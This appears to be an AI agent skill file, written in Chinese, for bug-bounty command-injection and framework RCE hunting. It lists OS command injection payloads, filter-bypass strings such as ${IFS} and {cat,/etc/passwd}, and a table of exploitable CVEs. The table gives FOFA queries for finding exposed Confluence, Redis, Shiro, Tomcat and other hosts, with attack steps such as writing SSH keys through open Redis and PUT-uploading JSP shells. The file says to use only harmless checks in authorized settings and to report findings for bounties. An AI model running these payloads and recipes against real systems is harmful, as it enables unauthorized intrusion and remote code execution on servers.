---
name: rce-pwn
description: 命令注入与框架RCE——OS命令注入绕过+高赏金CVE速查。Use when 看到命令执行点/已知框架版本/上传点。
---

# 命令注入 & 框架 RCE

> 蒸馏自CC挖洞武器库 rce-pwn + 高价值CVE（实战验证）

## OS命令注入（最快出洞）

```bash
# 找注入点：ping/ipconfig/whoami类功能、文件名参数、邮件功能
# 基础测试
127.0.0.1; whoami        # 分号
127.0.0.1|whoami         # 管道
127.0.0.1&&whoami        # 与
127.0.0.1$(whoami)       # 命令替换
`whoami`                 # 反引号
# 盲注确认（无回显）：sleep/延迟
127.0.0.1; sleep 5
# 无回显外带（授权环境）：dnslog/HTTP回调
```

## 空格/字符过滤绕过

```
空格 → ${IFS}、%09、$IFS$9、{cat,/etc/passwd}
;&&| → %3B、%26%26、%7C
cat → c""at、c\at、tac、less、more、head
whoami → who$()ami、w"h"oami
```

## 高赏金CVE速查（2026实战验证）

| 组件 | CVE/漏洞 | FOFA | 验证 |
|---|---|---|---|
| Confluence | OGNL注入 | app="Atlassian-Confluence" | /pages/doenterpagevariables.action 触发OGNL |
| Nacos | 默认密钥JWT | app="Nacos" | 伪造JWT登录→配置泄露→RCE |
| Solr | RCE | app="Solr" | /solr/admin/cores 看initFailures |
| Redis | 未授权 | protocol="redis" | redis-cli直连→写authorized_keys |
| Fastjson | 反序列化 | app="Fastjson" | @type探测→autoType绕过 |
| Shiro | 默认密钥 | 响应头rememberMe | deleteMe回显=密钥可用 |
| Tomcat | PUT写shell | app="Tomcat" | PUT上传.jsp（CVE-2017-12615） |
| Django | JSONField SQLi | app="Django" | CVE-2019-14234 |
| 通达OA | 多个RCE | app="Tongda-OA" | 任意文件上传/包含 |
| 帆软 | 反序列化 | app="FineReport" | 未授权→RCE |

## 框架漏洞利用流程

1. 指纹识别（响应头/页面特征/路径特征）
2. 查CVE利用条件（版本匹配）
3. 纯GET验证（很多漏洞GET可测，零payload原则）
4. 有攻击痕迹（initFailures含oast.me等）→ 证明已被打过 = RCE可行铁证

## 提交要点

- RCE = 高危（补天¥3000-10000），必须有执行命令的证据（id输出/写文件成功）
- 无害化验证：只执行`id`/`echo`，不破坏数据
